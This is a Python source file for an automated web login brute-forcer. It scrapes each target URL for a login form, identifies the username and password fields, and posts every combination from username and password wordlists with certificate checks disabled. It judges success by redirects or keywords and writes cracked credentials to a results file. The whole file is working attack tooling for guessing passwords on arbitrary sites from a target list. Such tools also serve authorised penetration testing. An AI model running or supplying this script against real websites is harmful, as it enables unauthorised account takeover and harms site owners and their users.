import requests
from bs4 import BeautifulSoup
import config
from utils import logger, load_file
import urllib3
from urllib.parse import urljoin
import os
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

STOP_FLAG = False

def get_form_details(url):
    try:
        resp = requests.get(url, timeout=config.TIMEOUT, verify=False)
        soup = BeautifulSoup(resp.content, "html.parser")
        forms = soup.find_all("form")
        for form in forms:
            action = form.attrs.get("action")
            post_url = urljoin(url, action) if action else url
            user_field = None
            pass_field = None
            inputs = form.find_all("input")
            for i in inputs:
                input_type = i.attrs.get("type", "text")
                input_name = i.attrs.get("name")
                if not input_name:
                    continue
                if input_type == "password":
                    pass_field = input_name
                elif input_type in ["text", "email"] and not user_field:
                    user_field = input_name
            if user_field and pass_field:
                return post_url, user_field, pass_field
    except Exception as e:
        logger.error(f"Parse form failed {url}: {e}")
    return None, None, None

def run_simple_crack(targets=None, usernames=None, passwords=None):
    global STOP_FLAG
    logger.info("Starting simple mode crack...")
    if targets is None:
        targets = load_file(config.SIMPLE_LIST_FILE)
        if not targets:
            targets = load_file(config.URL_LIST_FILE)
    if not targets:
        logger.error("No target URLs available")
        return []
    if usernames is None:
        usernames = load_file(config.USERNAME_FILE) or config.DEFAULT_USERNAMES
    if passwords is None:
        passwords = load_file(config.PASSWORD_FILE) or config.DEFAULT_PASSWORDS
    results = []
    for url in targets:
        if STOP_FLAG:
            logger.warning("Task stopped")
            break
        logger.info(f"Attempting to crack: {url}")
        post_url, user_field, pass_field = get_form_details(url)
        if not post_url or not user_field or not pass_field:
            logger.warning(f"Cannot auto-identify form fields, skipping: {url}")
            continue
        logger.info(f"Target details: URL={post_url}, UserField={user_field}, PassField={pass_field}")
        found = False
        for user in usernames:
            if found and config.STOP_ON_SUCCESS:
                break
            if STOP_FLAG:
                break
            for i, pwd in enumerate(passwords):
                if STOP_FLAG:
                    break
                try:
                    logger.info(f"[{url}] Trying: {user}:{pwd} ({i+1}/{len(passwords)})")
                    data = {user_field: user, pass_field: pwd}
                    resp = requests.post(post_url, data=data, timeout=5, verify=False, allow_redirects=False)
                    is_success = False
                    if resp.status_code in [301, 302]:
                        location = resp.headers.get("Location", "").lower()
                        if "login" not in location and "error" not in location and "fail" not in location:
                            is_success = True
                    elif any(k in resp.text.lower() for k in config.SUCCESS_KEYWORDS):
                        is_success = True
                    text_lower = resp.text.lower()
                    if any(k.lower() in text_lower for k in config.ERROR_KEYWORDS):
                        is_success = False
                    elif any(k.lower() in text_lower for k in config.SUCCESS_KEYWORDS):
                        is_success = True
                    if is_success:
                        result = {
                            "url": url,
                            "username": user,
                            "password": pwd,
                            "timestamp": datetime.now().isoformat()
                        }
                        results.append(result)
                        logger.info(f"[SUCCESS] Cracked: {url} -> {user}:{pwd}")
                        with open(config.RESULTS_FILE, "a", encoding="utf-8") as f:
                            f.write(f"{url} | {user}:{pwd}\n")
                        if config.STOP_ON_SUCCESS:
                            found = True
                            break
                    else:
                        logger.info(f"[{url}] Failed: {user}:{pwd}")
                except Exception as e:
                    logger.error(f"[{url}] Request error ({user}:{pwd}): {e}")
        if not found and not STOP_FLAG:
            logger.info(f"Crack finished, no valid credentials found: {url}")
    return results

if __name__ == '__main__':
    run_simple_crack()
